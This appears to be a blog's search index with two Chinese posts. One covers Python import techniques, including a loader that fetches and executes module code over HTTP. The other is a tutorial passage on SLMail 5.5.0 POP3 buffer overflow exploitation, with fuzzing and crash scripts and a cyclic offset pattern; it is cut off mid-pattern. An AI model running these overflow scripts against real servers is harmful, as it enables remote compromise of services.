<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python花式导包的几种方法</title>
      <link href="/2018/03/15/python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2018/03/15/python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows缓冲区溢出测试</title>
      <link href="/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
      <url>/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4></blockquote><p>程序漏洞从哪里来<br>    罪恶的根源:变量<br>    数据与代码边界不清<br>    最简漏洞原理—-shell脚本漏洞</p><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”撑爆”,从而覆盖了相邻内存区域的数据；</p><p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p><p>如何发现漏洞<br>    源码审计<br>    逆向工程<br>    模糊测试<br>        向程序堆栈半随机的数据,根据内存变化判断溢出<br>        数据生成器:生成随机,半随机数据<br>        测试工具:识别溢出漏洞</p><blockquote><h4 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h4></blockquote><p>FUZZER<br>SLMail 5.5.0 Mail Server<br>    POP3 PASS 命令存在缓冲区溢出漏洞<br>    无需身份验证实现远程代码执行<br>    win7++ 已升级DEP ASLR<br>        DEP:阻止代码从数据页被执行<br>        ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化</p><p><code>ImmunityDebugger_1_85setup.exe</code><br><code>mana.py</code></p><p>FUZZING<br>    nc 110端口<br>    了解未知协议<br>        Wireshark<br>        RFC</p><blockquote><h4 id="python代码01-py"><a href="#python代码01-py" class="headerlink" title="python代码01.py"></a>python代码<code>01.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nSending evil buffer...."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER user'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">测试PASS命令接收到大量数据时是否会溢出</span><br><span class="line">EIP寄存器存放下一条指令的地址</span><br><span class="line">&gt;<span class="comment">#### python代码`02.py`</span></span><br><span class="line">```python</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer)&lt;=<span class="number">30</span>:</span><br><span class="line">buffer.append(<span class="string">"A"</span>=*counter)</span><br><span class="line">counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+string+<span class="string">'\r\n'</span>)</span><br><span class="line">s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><blockquote><h4 id="2700个字符实现EIP寄存器溢出03-py"><a href="#2700个字符实现EIP寄存器溢出03-py" class="headerlink" title="2700个字符实现EIP寄存器溢出03.py"></a>2700个字符实现EIP寄存器溢出<code>03.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>找到精确溢出的4个字符<br>    二分法<br>    唯一字串法<br>        <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></p><blockquote><h4 id="python代码04-py"><a href="#python代码04-py" class="headerlink" title="python代码04.py"></a>python代码<code>04.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2C